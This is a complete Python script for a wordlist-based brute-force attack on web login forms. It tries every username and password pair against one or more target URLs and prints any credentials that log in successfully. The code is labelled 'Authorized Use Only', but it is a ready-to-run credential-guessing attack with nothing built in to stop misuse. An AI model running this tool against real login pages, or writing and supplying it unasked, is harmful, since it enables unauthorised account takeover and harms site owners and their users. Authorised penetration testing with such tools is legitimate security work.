import argparse
import requests
import sys
from colorama import Fore, Style, init
from my_banner import banner

init(autoreset=True)

# -------------------- Colors & Tags --------------------
INFO = Fore.CYAN + "[INFO]" + Style.RESET_ALL
TRY  = Fore.YELLOW + "[TRY ]" + Style.RESET_ALL
OK   = Fore.GREEN + "[ OK ]" + Style.RESET_ALL
ERR  = Fore.RED + "[ERR ]" + Style.RESET_ALL

SEPARATOR = Fore.CYAN + "─" * 60 + Style.RESET_ALL


# -------------------- Argument Parsing --------------------
def get_args():
    parser = argparse.ArgumentParser(
        description="Authentication Testing Tool (Authorized Use Only)",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Example:
  python tool.py -t http://site/login.php -u users.txt -p passwords.txt
  python tool.py -t site1 -u users.txt -p passwords.txt
"""
    )

    parser.add_argument(
        "-t", "--target",
        required=True,
        nargs="+",
        help="Target URL"
    )

    parser.add_argument(
        "-u", "--usernames",
        required=True,
        help="Path to username wordlist file"
    )

    parser.add_argument(
        "-p", "--passwords",
        required=True,
        help="Path to password wordlist file"
    )

    parser.add_argument(
        "-l", "--login",
        required=True,
        help="String that indicates the user is logged in. Example: Welcome!"
    )

    return parser.parse_args()


# Get Wordlist
def load_wordlist(path, label):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            items = [line.strip() for line in f if line.strip()]
            if not items:
                print(f"{ERR} {label} wordlist is empty: {path}")
            return items
    except FileNotFoundError:
        print(f"{ERR} {label} wordlist not found: {path}")
        return []

# Get Target
def parse_targets(raw_targets):
    targets = []
    for entry in raw_targets:
        targets.extend(t.strip() for t in entry.split(",") if t.strip())
    return list(dict.fromkeys(targets))

# Run the brute force attack
def brute_force(usernames, passwords, targets, success_marker):
    session = requests.Session()

    total = len(usernames) * len(passwords) * len(targets)
    attempt = 0

    print(SEPARATOR)
    print(f"{INFO} Starting authentication tests")
    print(f"{INFO} Total attempts: {total}")
    print(SEPARATOR)

    for target in targets:
        print(Fore.YELLOW + f"{INFO} Target: {target}")
        print(SEPARATOR)

        for user in usernames:
            for pwd in passwords:
                attempt += 1
                print(
                    f"\r{TRY} [{attempt}/{total}] {user}:{pwd}",
                    end="",
                    flush=True
                )

                try:
                    response = session.post(
                        target,
                        data={"uname": user, "pass": pwd},
                        timeout=3
                    )
                
                except requests.RequestException:
                    continue

                if success_marker in response.text:
                    print("\n" + SEPARATOR)
                    print(Fore.GREEN + f"{OK} Valid credentials found!")
                    print(Fore.GREEN + f"{OK} Username: {user}")
                    print(Fore.GREEN + f"{OK} Password: {pwd}")
                    print(SEPARATOR)
                    return

    print("\n" + SEPARATOR)
    print(f"{INFO} Testing complete — no valid credentials found")
    print(SEPARATOR)

def main():
    print(Fore.RED + banner + Style.RESET_ALL)

    args = get_args()

    usernames = load_wordlist(args.usernames, "Username")
    passwords = load_wordlist(args.passwords, "Password")
    targets   = parse_targets(args.target)
    success_marker = args.login

    if not usernames or not passwords or not targets:
        print(f"{ERR} Missing required input — exiting")
        sys.exit(1)

    print(SEPARATOR)
    print(f"{INFO} Targets   : {len(targets)}")
    print(f"{INFO} Usernames : {len(usernames)}")
    print(f"{INFO} Passwords : {len(passwords)}")
    print(SEPARATOR)

    brute_force(usernames, passwords, targets, success_marker)

if __name__ == "__main__":
    main()